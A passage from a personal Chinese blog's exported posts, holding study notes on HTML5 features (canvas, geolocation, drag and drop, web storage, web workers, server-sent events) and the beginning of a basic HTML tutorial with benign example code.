grd.addColorStop(1,\"#00FF00\"); cxt.fillStyle=grd; cxt.fillRect(0,0,175,50); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas3\"); var cxt=c.getContext(\"2d\"); var grd=cxt.createLinearGradient(0,0,175,50); grd.addColorStop(0,\"#FF0000\"); grd.addColorStop(1,\"#00FF00\"); cxt.fillStyle=grd; cxt.fillRect(0,0,175,50); 放置图像&lt;canvas id=\"myCanvas4\" width=\"200\" height=\"200\" style=\"border:1px solid #c3c3c3;\"&gt; Your browser does not support the canvas element. &lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; var c=document.getElementById(\"myCanvas4\"); var cxt=c.getContext(\"2d\"); var img=new Image() img.src=\"FrontEnd_HTML_Advanced/start_again.jpg\" cxt.drawImage(img,0,0); &lt;/script&gt; Your browser does not support the canvas element. var c=document.getElementById(\"myCanvas4\"); var cxt=c.getContext(\"2d\"); var img=new Image() img.src=\"FrontEnd_HTML_Advanced/start_again.jpg\" cxt.drawImage(img,0,0); 内联 SVGSVG 指可伸缩矢量图形 (Scalable Vector Graphics)，用于定义用于网络的基于矢量的图形。SVG 使用 XML 格式定义图形。SVG 图像在放大或改变尺寸的情况下其图形质量不会有损失。SVG 是万维网联盟的标准。 &lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" height=\"190\"&gt; &lt;polygon points=\"100,10 40,180 190,60 10,60 160,180\" style=\"fill:lime;stroke:purple;stroke-width:5;fill-rule:evenodd;\" /&gt; &lt;/svg&gt; SVG 本身就挺复杂的，也很强大，有专门的教程来学这个。 不过目前来说我还用不到呢，后面感兴趣再慢慢看吧。 Canvas VS SVGCanvasCanvas 通过 JavaScript 来绘制 2D 图形。 Canvas 逐像素进行渲染。 在 canvas 中，一旦图形被绘制完成，它就不会继续得到浏览器的关注。 如果其位置发生变化，那么整个场景也需要重新绘制，包括任何或许已被图形覆盖的对象。 依赖分辨率 不支持事件处理器 弱的文本渲染能力 能够以 .png 或 .jpg 格式保存结果图像 最适合图像密集型的游戏，其中的许多对象会被频繁重绘 SVGSVG 是一种使用 XML 描述 2D 图形的语言。 SVG 基于 XML，这意味着 SVG DOM 中的每个元素都是可用的。可以为某个元素附加 JavaScript 事件处理器。 在 SVG 中，每个被绘制的图形均被视为对象。如果 SVG 对象的属性发生变化，那么浏览器能够自动重现图形。 不依赖分辨率 支持事件处理器 最适合带有大型渲染区域的应用程序（比如谷歌地图） 复杂度高会减慢渲染速度（任何过度使用 DOM 的应用都不快） 不适合游戏应用 地理定位HTML5 提供了一个获取用户位置信息的API。 当然这个需要用户的许可才行。 getCurrentPosition() 方法可以用来获得用户的位置。如果能正常调用的话，会返回如下信息。 属性 描述 coords.latitude 十进制数的纬度 coords.longitude 十进制数的经度 coords.accuracy 位置精度 coords.altitude 海拔，海平面以上以米计 coords.altitudeAccuracy 位置的海拔精度 coords.heading 方向，从正北开始以度计 coords.speed 速度，以米/每秒计 timestamp 响应的日期/时间 如果getCurrentPosition()运行成功，则向参数showPosition中规定的函数返回一个coordinates对象。 showPosition() 函数获得并显示经度和纬度。 getCurrentPosition() 方法的第二个参数用于处理错误。它规定当获取用户位置失败时运行的函数。（类似于回调函数？） showError() 函数用于处理错误。 &lt;p id=\"geolocation_demo\"&gt;点击这个按钮，将显示您的坐标：&lt;/p&gt; &lt;button onclick=\"getLocation()\"&gt;试一下&lt;/button&gt; &lt;script&gt; var x=document.getElementById(\"geolocation_demo\"); function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(showPosition, showError); } else{x.innerHTML=\"Geolocation is not supported by this browser.\";} } function showPosition(position) { x.innerHTML=\"Latitude: \" + position.coords.latitude + \"&lt;br /&gt;Longitude: \" + position.coords.longitude; } function showError(error) { switch(error.code) { case error.PERMISSION_DENIED: x.innerHTML=\"User denied the request for Geolocation.\" break; case error.POSITION_UNAVAILABLE: x.innerHTML=\"Location information is unavailable.\" break; case error.TIMEOUT: x.innerHTML=\"The request to get user location timed out.\" break; case error.UNKNOWN_ERROR: x.innerHTML=\"An unknown error occurred.\" break; } } &lt;/script&gt; 点击这个按钮，将显示您的坐标： 试一下 var x=document.getElementById(\"geolocation_demo\"); function getLocation() { if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(showPosition, showError); } else{x.innerHTML=\"Geolocation is not supported by this browser.\";} } function showPosition(position) { x.innerHTML=\"Latitude: \" + position.coords.latitude + \"Longitude: \" + position.coords.longitude; } function showError(error) { switch(error.code) { case error.PERMISSION_DENIED: x.innerHTML=\"User denied the request for Geolocation.\" break; case error.POSITION_UNAVAILABLE: x.innerHTML=\"Location information is unavailable.\" break; case error.TIMEOUT: x.innerHTML=\"The request to get user location timed out.\" break; case error.UNKNOWN_ERROR: x.innerHTML=\"An unknown error occurred.\" break; } } 如需在地图中显示结果，可以调用谷歌地图、百度地图等地图的API。 还有一些其他的方法： watchPosition() 返回用户的当前位置，并继续返回用户移动时的更新位置（类似于 GPS）。 clearWatch() 停止 watchPosition() 方法。 拖放拖放（Drag 和 Drop）指的是抓取某物并拖入不同的位置。 HTML5 中任何元素都是可拖放的。 （这里我还不是很明白，后面具体看看 JavaScript 的时候再回来看一看 &lt;style type=\"text/css\"&gt; #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;} &lt;/style&gt; &lt;script type=\"text/javascript\"&gt; function allowDrop(ev) { ev.preventDefault(); } function drag(ev) { ev.dataTransfer.setData(\"Text\",ev.target.id); } function drop(ev) { ev.preventDefault(); var data=ev.dataTransfer.getData(\"Text\"); ev.target.appendChild(document.getElementById(data)); } &lt;/script&gt; &lt;p&gt;请把图片拖放到矩形中：&lt;/p&gt; &lt;div id=\"divmiao1\" ondrop=\"drop(event)\" ondragover=\"allowDrop(event)\"&gt;&lt;/div&gt; &lt;br /&gt; &lt;img id=\"drag1\" src=\"FrontEnd_HTML_Advanced/start_again.jpg\" draggable=\"true\" ondragstart=\"drag(event)\" /&gt; #divmiao1 {width:200px; height:200px;padding:10px;border:1px solid #aaaaaa;} function allowDrop(ev) { ev.preventDefault(); } function drag(ev) { ev.dataTransfer.setData(\"Text\",ev.target.id); } function drop(ev) { ev.preventDefault(); var data=ev.dataTransfer.getData(\"Text\"); ev.target.appendChild(document.getElementById(data)); } 请把图片拖放到矩形中： draggable首先需要把想要拖动的元素新增一个 draggable 属性，即 &lt;img draggable=\"true\"&gt;。 然后，规定当元素被拖动时发生的事情。 ondragstartondragstart 属性调用了一个 drag(event) 函数，规定拖动什么数据。 dataTransfer.setData() 方法设置被拖动数据的数据类型和值。这里的数据类型是 “text”，而值是这个可拖动元素的 id (“drag1”)。 ondragoverondragover 事件规定被拖动的数据能够被放置到何处。 默认地，数据/元素无法被放置到其他元素中。为了实现拖放，我们必须阻止元素的这种默认的处理方式。 这个任务由 ondragover 事件的 event.preventDefault() 方法完成。 ondrop当放开被拖数据时，会发生 drop 事件。 在上面的例子中，ondrop 属性调用了一个函数，drop(event)。 function drop(ev) { ev.preventDefault(); var data = ev.dataTransfer.getData(\"text\"); ev.target.appendChild(document.getElementById(data)); } 调用 preventDefault() 来阻止数据的浏览器默认处理方式（drop 事件的默认行为是以链接形式打开） 通过 dataTransfer.getData() 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据 被拖数据是被拖元素的 id (“drag1”) 把被拖元素追加到放置元素中 本地存储通过本地存储（Local Storage），web 应用程序能够在用户浏览器中对数据进行本地的存储。 在 HTML5 之前，应用程序数据只能存储在 cookie 中，包括每个服务器请求。 本地存储则更安全，并且可在不影响网站性能的前提下将大量数据存储于本地。 与 cookie 不同，存储限制要大得多（至少5MB），并且信息不会被传输到服务器。 HTML 本地存储提供了两个在客户端存储数据的对象： window.localStorage - 存储没有截止日期的数据，当浏览器被关闭时数据不会被删除 window.sessionStorage - 针对一个 session 来存储数据，当关闭浏览器标签页时数据会丢失 localStorage 对象&lt;div id=\"test_result\"&gt;&lt;/div&gt; &lt;script&gt; // Check browser support if (typeof(Storage) !== \"undefined\") { // 存储 Store localStorage.setItem(\"website\", \"https://miaotony.xyz\"); // 取回 Retrieve document.getElementById(\"test_result\").innerHTML = localStorage.getItem(\"website\"); } else { document.getElementById(\"test_result\").innerHTML = \"抱歉！您的浏览器不支持 Web Storage ...\"; } &lt;/script&gt; // Check browser support if (typeof(Storage) !== \"undefined\") { // 存储 Store localStorage.setItem(\"website\", \"https://miaotony.xyz\"); // 取回 Retrieve document.getElementById(\"test_result\").innerHTML = localStorage.getItem(\"website\"); } else { document.getElementById(\"test_result\").innerHTML = \"抱歉！您的浏览器不支持 Web Storage ...\"; } 首先创建 localStorage 名称/值对，其中：name=”website”，value=”https://miaotony.xyz\" 而后取回 “website” 的值，并把它插到 id=”test_result” 的元素中。 也可以把名称作为一个属性来使用，比如： // 存储 localStorage.website = \"https://miaotony.xyz\"; // 取回 document.getElementById(\"test_result\").innerHTML = localStorage.website; 删除某一 localStorage 项目的语法： localStorage.removeItem(\"website\"); 名称/值对始终存储为字符串。如果需要请记得把它们转换为其他格式！ 下面这个对用户点击按钮的次数进行计数。在代码中，值字符串被转换为数值，依次对计数进行递增： &lt;script&gt; function clickCounter1() { if(typeof(Storage) !== \"undefined\") { if (localStorage.clickcount) { localStorage.clickcount = Number(localStorage.clickcount)+1; } else { localStorage.clickcount = 1; } document.getElementById(\"result2\").innerHTML = \"您已经点击这个按钮 \" + localStorage.clickcount + \" 次。\"; } else { document.getElementById(\"result2\").innerHTML = \"抱歉！您的浏览器不支持 Web Storage ...\"; } } &lt;/script&gt; &lt;button onclick=\"clickCounter1()\" type=\"button\"&gt;请点击这里！&lt;/button&gt; &lt;div id=\"result2\"&gt;&lt;/div&gt; function clickCounter1() { if(typeof(Storage) !== \"undefined\") { if (localStorage.clickcount) { localStorage.clickcount = Number(localStorage.clickcount)+1; } else { localStorage.clickcount = 1; } document.getElementById(\"result2\").innerHTML = \"您已经点击这个按钮 \" + localStorage.clickcount + \" 次。\"; } else { document.getElementById(\"result2\").innerHTML = \"抱歉！您的浏览器不支持 Web Storage ...\"; } } 请点击这里！ 点击之后计数器将递增，且关闭这个网页/浏览器再打开这个页面，数字会从上一次的位置递增，不会重置。 sessionStorage 对象sessionStorage 对象等同 localStorage 对象，不同之处在于只对一个 session 存储数据。如果用户关闭具体的浏览器标签页，数据也会被删除。 &lt;script&gt; function clickCounter2() { if(typeof(Storage) !== \"undefined\") { if (sessionStorage.clickcount) { sessionStorage.clickcount = Number(sessionStorage.clickcount)+1; } else { sessionStorage.clickcount = 1; } document.getElementById(\"result3\").innerHTML = \"在本 session 中，您已经点击这个按钮 \" + sessionStorage.clickcount + \" 次。\"; } else { document.getElementById(\"result3\").innerHTML = \"抱歉！您的浏览器不支持 Web Storage ...\"; } } &lt;/script&gt; &lt;button onclick=\"clickCounter2()\" type=\"button\"&gt;请点击这里&lt;/button&gt; &lt;div id=\"result3\"&gt;&lt;/div&gt; function clickCounter2() { if(typeof(Storage) !== \"undefined\") { if (sessionStorage.clickcount) { sessionStorage.clickcount = Number(sessionStorage.clickcount)+1; } else { sessionStorage.clickcount = 1; } document.getElementById(\"result3\").innerHTML = \"在本 session 中，您已经点击这个按钮 \" + sessionStorage.clickcount + \" 次。\"; } else { document.getElementById(\"result3\").innerHTML = \"抱歉！您的浏览器不支持 Web Storage ...\"; } } 请点击这里 点击之后计数器也将递增，但是关闭这个网页/浏览器再打开这个页面，数字不会从上一次的位置递增，直接重置。 当然，刷新的话还是同一个 session，所以还是保留的。 按下 F12，在存储里也可以看得到会话存储和本地存储。 应用程序缓存使用应用程序缓存（Application Cache），通过创建 cache manifest 文件，可轻松创建 web 应用的离线版本。 Cache Manifest 基础如需启用应用程序缓存，需要在文档的 &lt;html&gt; 标签中包含 manifest 属性。 &lt;!DOCTYPE HTML&gt; &lt;html manifest=\"demo.appcache\"&gt; ... &lt;/html&gt; 每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。 manifest 文件的建议文件扩展名是：”.appcache”。 manifest 文件需要设置正确的 MIME-type，即 “text/cache-manifest”。必须在 web 服务器上进行配置。 Manifest 文件manifest 文件是简单的文本文件，用来告知浏览器被缓存的内容（以及不缓存的内容）。 包含三个部分： CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存 NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存 FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面） 完整范例： CACHE MANIFEST # 2020-02-20 v1.0.0 /theme.css /logo.gif /main.js NETWORK: * FALLBACK: /html/ /offline.html 第一行，CACHE MANIFEST，是必需的。 NETWORK 中，可以使用星号来指示所有其他其他资源/文件都需要联网。 FALLBACK 中，规定如果无法建立因特网连接，则用 “offline.html” 替代 /html/ 目录中的所有文件。 一旦应用被缓存，它就会保持缓存，更新缓存有以下这几种情况。 用户清空浏览器缓存 manifest 文件被修改 由程序来更新应用缓存 以 “#” 开头的是注释行，但也可满足其他用途。应用的缓存只会在其 manifest 文件改变时被更新。 更新注释行中的日期和版本号就可以让浏览器重新缓存文件。 Web WorkersWeb worker 是运行在后台的 JavaScript，不会影响页面的性能。 当在 HTML 页面中执行脚本时，在脚本执行结束之前页面是不可响应的。使用 Web worker 就可以独立于其他脚本来在后台执行，前台照样可以进行点击、选取内容等等操作。 通常用于耗费 CPU 资源的任务。 由于 web worker 位于外部文件中，它们无法访问下例 JavaScript 对象： window 对象 document 对象 parent 对象 首先需要创建一个 web worker 文件，比如这里创建了一个计数的脚本。 var i = 0; function timedCount() { i = i + 1; postMessage(i); setTimeout(\"timedCount()\",500); } timedCount(); 其中的 postMessage() 方法用于向 HTML 页面传回一段消息。 而后在 HTML 中创建一个 Web Worker 对象，运行上面文件中的代码。 w = new Worker(\"demo_workers.js\"); 然后让 Web Worker 监听 onmessage 事件。 当 web worker 传送消息时，会执行事件监听器中的代码。来自 web worker 的数据会存储于 event.data 中。 w.onmessage = function(event){ document.getElementById(\"result\").innerHTML = event.data; }; 创建 web worker 后，它会继续监听消息（即使在外部脚本完成后）直到其被终止为止。 需要终止这个 web worker，并释放浏览器/计算机资源，可以使用 terminate() 方法。 终止后再将原来的变量（w）设置为 undefined，则又可以复用代码啦！ HTML中的完整代码如下。 &lt;p&gt;Count numbers: &lt;output id=\"result\"&gt;&lt;/output&gt;&lt;/p&gt; &lt;button onclick=\"startWorker()\"&gt;Start Worker&lt;/button&gt; &lt;button onclick=\"stopWorker()\"&gt;Stop Worker&lt;/button&gt; &lt;br&gt;&lt;br&gt; &lt;script&gt; var w; function startWorker() { if(typeof(Worker) !== \"undefined\") { if(typeof(w) == \"undefined\") { w = new Worker(\"demo_workers.js\"); } w.onmessage = function(event) { document.getElementById(\"result\").innerHTML = event.data; }; } else { document.getElementById(\"result\").innerHTML = \"Sorry! No Web Worker support.\"; } } function stopWorker() { w.terminate(); w = undefined; } &lt;/script&gt; Server-Sent 事件Server-Sent 事件（SSE）指的是网页自动从服务器获得更新。 EventSource 对象用于接收服务器发送事件通知。 它有这几种方法： 事件 描述 onopen 当通往服务器的连接被打开 onmessage 当接收到消息 onerror 当发生错误 最常用的就 onmessage 方法。 var source = new EventSource(\"demo_sse.php\"); source.onmessage = function(event) { document.getElementById(\"result\").innerHTML += event.data + \"&lt;br&gt;\"; }; 这里创建了一个 EventSource 对象，然后规定发送更新的页面的 URL（”demo_sse.php”）。 每当接收到一次更新，就会发生 onmessage 事件，把已接收的数据推入 id 为 “result” 的元素中。 最好再加一个判断，看看浏览器是否支持SSE。 &lt;div id=\"result\"&gt;&lt;/div&gt; &lt;script&gt; if(typeof(EventSource)!==\"undefined\") { var source=new EventSource(\"/example/html5/demo_sse.php\"); source.onmessage=function(event) { document.getElementById(\"result\").innerHTML+=event.data + \"&lt;br /&gt;\"; }; } else { document.getElementById(\"result\").innerHTML=\"抱歉，您的浏览器不支持 server-sent 事件 ...\"; } &lt;/script&gt; 服务器端的话，把 \"Content-Type\" 报头设置为 \"text/event-stream\"，就可以开始发送事件流了。 小结HTML 的部分大概就告一段落了，如果要具体学的话，要想搞清楚每个属性的含义就感觉在看文档了，感觉没有必要。 还不如之后有不理解的再回来翻一翻，更狭义的知识点直接查文档就好了呀！ 接下来就慢慢看看 CSS 和 JavaScript好了。 溜了溜了。 （这个寒假出不了门好难受啊嘤嘤嘤&nbsp;","path":"2020/02/18/FrontEnd_HTML_Advanced/"},{"title":"FrontEnd | HTML 基础入门学习笔记","text":"前言最近想系统一点学一学前端，这一篇博客就简要记录一些前端中 HTML 基础入门的学习笔记吧。 看完了小甲鱼目前更新了的web开发入门的视频，讲的还是挺不错的，总体来说还算比较系统的，而且疑车有据23333。 不过感觉不够全面，于是再来刷了一遍 W3School。 后面忘了还可以再来看看，或者再查文档就完事了。😂 其实就是简单过一遍23333 类似于抄一遍（x 这篇文章超长长长长长长长长…… 所以先做好准备。 由于我的博客自带了一些CSS样式，显示的效果可能和预计的不同，最好还是建一个新的HTML文件来试试吧。 一些参考的网站W3School HTML 教程 速查宝典：HTML5 API速查（鱼C工作室） HTML 菜鸟教程 B站视频 （小甲鱼的视频居然还没更新完，催更一波 整体框架HTML5 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 在VS Code中可以直接输入html:5，按下Tab键即可自动输入模板。用的是 Emmet Abbreviation。 下面主要参考 W3School 的教程。更详细的请参考官网。 元素HTML 文档是由 HTML 元素定义的。 元素指的是从开始标签（start tag） or开放标签（opening tag） 到结束标签（end tag） or闭合标签（closing tag） 的所有代码。 空元素在开始标签中进行关闭（以开始标签的结束而结束），如&lt;br /&gt;。虽然写成&lt;br&gt;也行，但建议都关闭。 HTML 标签对大小写不敏感：&lt;P&gt; 等同于&lt;p&gt;。但是推荐/强制使用小写字母。 属性属性为 HTML 元素提供附加信息。 属性总是以名称/值对的形式出现，比如：*name=”value”*。总是在 HTML 元素的开始标签中规定。 属性和属性值对大小写不敏感。但推荐使用小写。 属性值要包含在引号内，双引号、单引号均可。若属性值本身就含有双引号，那么必须使用单引号↓。 name='Bill \"HelloWorld\" Gates' 常用的 HTML 属性： 属性 值 描述 class classname 规定元素的类名（classname） id id 规定元素的唯一 id style style_definition 规定元素的行内样式（inline style） title text 规定元素的额外信息（可在工具提示中显示） 头部 headhead元素中可以包含&lt;title&gt;、&lt;base&gt;、&lt;link&gt;、&lt;meta&gt;、&lt;script&gt; 以及 &lt;style&gt;。 title 元素&lt;title&gt; 标签定义文档的标题。 &lt;head&gt; &lt;title&gt;Title of the document&lt;/title&gt; &lt;/head&gt; base 元素&lt;base&gt; 标签为页面上的所有链接规定默认地址或默认目标（target）： &lt;head&gt; &lt;base href=\"https://miaotony.xyz/\" /&gt; &lt;base target=\"_blank\" /&gt; &lt;/head&gt; link 元素定义文档与外部资源之间的关系。如样式表等。 &lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\" /&gt; &lt;/head&gt; style 元素&lt;style&gt; 标签用于为 HTML 文档定义样式信息。 &lt;head&gt; &lt;style type=\"text/css\"&gt; body {background-color:yellow} p {color:blue} &lt;/style&gt; &lt;/head&gt; meta 元素元数据（metadata）是关于数据的信息。 &lt;meta&gt; 标签提供关于 HTML 文档的元数据。元数据不会显示在页面上，但是对于机器是可读的。 典型的情况是，meta 元素被用于规定页面的描述、关键词、文档的作者、最后修改时间以及其他元数据。 &lt;meta&gt; 标签始终位于 head 元素中。 元数据可用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他 web 服务。 指定 UTF-8 编码&lt;meta charset=\"utf-8\"&gt; 网页尺寸自适应&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; 一些SEO关键词优化关键词，描述，作者等。 &lt;meta name=\"keywords\" content=\"MiaoTony, HTML, test\" /&gt; &lt;meta name=\"description\" content=\"MiaoTony's HTML test.\"/&gt; &lt;meta name=\"author\" content=\"MiaoTony\" /&gt; 自动刷新跳转页面 / 重定向页面&lt;meta http-equiv=\"refresh\" content=\"0; https://miaotony.xyz\" /&gt; 0s后自动跳转。 标题标题（Heading）是通过 &lt;h1&gt; - &lt;h6&gt;定义，从大到小。 &lt;h1&gt;This is heading 1&lt;/h1&gt; &lt;h2&gt;This is heading 2&lt;/h2&gt; &lt;h3&gt;This is heading 3&lt;/h3&gt; &lt;h4&gt;This is heading 4&lt;/h4&gt; &lt;h5&gt;This is heading 5&lt;/h5&gt; &lt;h6&gt;This is heading 6&lt;/h6&gt; 请仅仅把标题标签用于标题文本。不要仅仅为了产生粗体文本而使用它们。请使用其它标签或 CSS 代替。 水平线&lt;hr /&gt;标签用于定义水平线。如↓。 段落 &lt;p&gt; 标签 浏览器会自动地在段落的前后添加空行。（&lt;p&gt; 是块级元素） 插入空行可以利用 &lt;br /&gt;，不要用 p 标签。 &lt;p&gt;这是段落&lt;/p&gt; 这是段落 在不产生一个新段落的情况下进行换行（新行），使用 &lt;br /&gt;，比如： &lt;p&gt;This is&lt;br /&gt;a para&lt;br /&gt;graph with line breaks&lt;/p&gt; This isa paragraph with line breaks --- 显示页面时，浏览器会移除源代码中多余的空格和空行。所有连续的空格或空行都会被算作一个空格。 需要注意的是，HTML 代码中的所有连续的空行（换行）也被显示为一个空格。比如： &lt;p&gt; 春眠不觉晓， 处处闻啼鸟。 夜来风雨声， 花落知多少。 &lt;/p&gt; 春眠不觉晓， 处处闻啼鸟。 夜来风雨声， 花落知多少。 注释&lt;!-- This is a comment --&gt; 条件注释条件注释定义只有 Internet Explorer 执行的 HTML 标签。 &lt;!--[if lt IE 9]&gt; &lt;script src=\"http://html5shiv.googlecode.com/svn/trunk/html5.js\"&gt;&lt;/script&gt; &lt;![endif]--&gt; 样式&lt;style&gt; 标签用于为 HTML 文档定义样式信息。 &lt;p style=\"font-family:verdana;color:red\"&gt; This text is in Verdana and red&lt;/p&gt; &lt;p style=\"font-family:times;color:green\"&gt; This text is in Times and green&lt;/p&gt; &lt;p style=\"font-size:30px\"&gt;This text is 30 pixels high&lt;/p&gt; This text is in Verdana and red This text is in Times and green This text is 30 pixels high 下面是一些实例，更多关于样式的需要看 **CSS教程** 来着（（ 背景颜色bgcolor 属性已经弃用了，要用background-color。 &lt;p style=\"background-color:blue\"&gt;This is a paragraph.&lt;/p&gt; This is a paragraph. 字体、颜色和尺寸style 属性淘汰了旧的 &lt;font&gt; 标签。 &lt;p style=\"font-family:arial;color:red;font-size:25px;\"&gt;A paragraph.&lt;/p&gt; A paragraph. 文本对齐使用text-align属性 style 属性淘汰了旧的 align 属性。 &lt;p style=\"text-align:left\"&gt;靠左对齐&lt;/p&gt; &lt;p style=\"text-align:center\"&gt;居中对齐&lt;/p&gt; &lt;p style=\"text-align:right\"&gt;靠右对齐&lt;/p&gt; 靠左对齐 居中对齐 靠右对齐 文本格式化定义很多供格式化输出的元素，比如粗体和斜体字。 格式化建议用strong、em这类基于内容的样式（content-based style）来代替b、i这类物理样式（physical style），更能语义化。 详见这里：HTML 教程延伸阅读：改变文本的外观和含义 &lt;b&gt;This text is bold&lt;/b&gt; &lt;strong&gt;This text is strong&lt;/strong&gt; &lt;big&gt;This text is big&lt;/big&gt; &lt;em&gt;This text is emphasized&lt;/em&gt; &lt;i&gt;This text is italic&lt;/i&gt; &lt;small&gt;This text is small&lt;/small&gt; This text contains &lt;sub&gt;subscript下标&lt;/sub&gt; This text contains &lt;sup&gt;superscript上标&lt;/sup&gt; This text is bold This text is strong This text is big This text is emphasized This text is italic This text is small This text containssubscript下标 This text containssuperscript上标 预格式文本&lt;pre&gt;标签 &lt;pre&gt; 这是 预格式文本。 它保留了 空格 和换行。 &lt;/pre&gt; &lt;pre&gt; for i in range(1,10): print(i) &lt;/pre&gt; 这是 预格式文本。 它保留了 空格 和换行。 pre 标签很适合显示计算机代码：（可以先用pre再用code标签 for i in range(1,10): print(i) 计算机/编程代码这些标签常用于显示计算机/编程代码↓。 &lt;code&gt;Computer code&lt;/code&gt; &lt;kbd&gt;Keyboard input&lt;/kbd&gt; &lt;tt&gt;Teletype text&lt;/tt&gt; &lt;samp&gt;Sample text&lt;/samp&gt; &lt;var&gt;Computer variable&lt;/var&gt; Computer code Keyboard input Teletype text Sample text Computer variable 地址address &lt;address&gt; Written by &lt;a href=\"https://miaotony.xyz\"&gt;MiaoTony&lt;/a&gt;.&lt;br /&gt; Visit me at:&lt;br /&gt; miaotony.xyz&lt;br /&gt; MeowBox &lt;/address&gt; Written by MiaoTony. Visit me at: miaotony.xyz MeowBox 缩写和首字母缩写在某些浏览器中，当把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。 &lt;abbr&gt;定义缩写，&lt;acronym&gt; 定义首字母缩写。 &lt;abbr title=\"etcetera\"&gt;etc.&lt;/abbr&gt; &lt;acronym title=\"World Wide Web\"&gt;WWW&lt;/acronym&gt; etc.WWW 文字方向（双向重写）若浏览器支持双流向覆盖 bi-directional override (bdo)，&lt;bdo&gt;元素用于覆盖当前文本方向，则下面这一行会从右向左输出 (rtl)。 &lt;bdo dir=\"rtl\"&gt; Here is some Hebrew text &lt;/bdo&gt; Here is some Hebrew text 引用使用 blockquote 元素的话，浏览器会插入换行和外边距，而 q 元素不会有任何特殊的呈现（只是加一个引号）。 这是长的引用： &lt;blockquote&gt; 这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。 &lt;/blockquote&gt; 这是短的引用： &lt;q&gt;这是短的引用。&lt;/q&gt; 这是长的引用： 这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。 这是短的引用：这是短的引用。 删除线 &amp; 插入线大多数浏览器会改写为删除文本和下划线文本。 一些老式的浏览器会把删除文本和下划线文本显示为普通文本。 &lt;p&gt;一打有 &lt;del&gt;二十&lt;/del&gt; &lt;ins&gt;十二&lt;/ins&gt; 件。&lt;/p&gt; 一打有 二十 十二 件。 定义 HTML5 标准： 如果设置了 &lt;dfn&gt; 元素的 title 属性，则定义项目： &lt;p&gt;The &lt;dfn title=\"World Health Organization\"&gt;WHO&lt;/dfn&gt; was founded in 1948.&lt;/p&gt; The WHO was founded in 1948. 如果 &lt;dfn&gt; 元素包含具有标题的 &lt;abbr&gt; 元素，则 title 定义项目： &lt;p&gt;The &lt;dfn&gt;&lt;abbr title=\"World Health Organization\"&gt;WHO&lt;/abbr&gt;&lt;/dfn&gt; was founded in 1948. &lt;/p&gt; The WHO was founded in 1948. 否则，&lt;dfn&gt; 文本内容即是项目，并且父元素包含定义。 &lt;p&gt;&lt;dfn&gt;WHO&lt;/dfn&gt; World Health Organization 成立于 1948 年。&lt;/p&gt; WHO World Health Organization 成立于 1948 年。 若希望简而化之，请使用第一条，或使用 &lt;abbr&gt; 代替。 著作标题浏览器通常以斜体来显示。 &lt;p&gt;&lt;cite&gt;The Scream&lt;/cite&gt; by Edward Munch. Painted in 1893.&lt;/p&gt; The Scream by Edward Munch. Painted in 1893. 计算机代码&lt;code&gt; 元素不保留多余的空格和折行。 &lt;code&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } &lt;/code&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } 需解决该问题，必须在 &lt;pre&gt; 元素中包围代码 &lt;code&gt; &lt;pre&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } &lt;/pre&gt; &lt;/code&gt; var person = { firstName:\"Bill\", lastName:\"Gates\", age:50, eyeColor:\"blue\" } 也可以code和pre反过来。 CSS 样式的引用外部样式表&lt;head&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\"&gt; &lt;/head&gt; 内部样式表&lt;head&gt; &lt;style type=\"text/css\"&gt; body {background-color: red} p {margin-left: 20px} &lt;/style&gt; &lt;/head&gt; 内联样式&lt;p style=\"color: red; margin-left: 20px\"&gt; This is a paragraph &lt;/p&gt; 优先级是 内联样式&gt;内部样式表&gt;外部样式表。 链接&lt;a href=\"https://miaotony.xyz\"&gt;MiaoTony's blog&lt;/a&gt; MiaoTony’s blog “链接文本” 不必一定是文本。图片或其他 HTML 元素都可以成为链接。 这是另一个 mailto 链接： &lt;p&gt;&lt;a href=\"mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!\"&gt;发送邮件！&lt;/a&gt; &lt;/p&gt; 发送邮件！ target 属性Target 属性可以定义被链接的文档在何处显示。 在新窗口打开： &lt;a href=\"https://miaotony.xyz\" target=\"_blank\"&gt;MiaoTony's blog&lt;/a&gt; MiaoTony’s blog 跳出页面框架： &lt;a href=\"https://miaotony.xyz\" target=\"_top\"&gt;MiaoTony's blog&lt;/a&gt; MiaoTony’s blog （在hexo部署的时候，好像把所有的target都改成 “_blank” 了 emmm name 属性name属性规定锚（anchor）的名称。可以使用 name 属性创建 HTML 页面中的书签。 当使用命名锚（named anchors）时，我们可以创建直接跳至该命名锚（比如页面中某个小节）的链接。 首先对锚进行命名，或者说创建一个书签—— &lt;a name=\"label123\"&gt;锚（显示在页面上的文本）&lt;/a&gt; 锚（显示在页面上的文本） 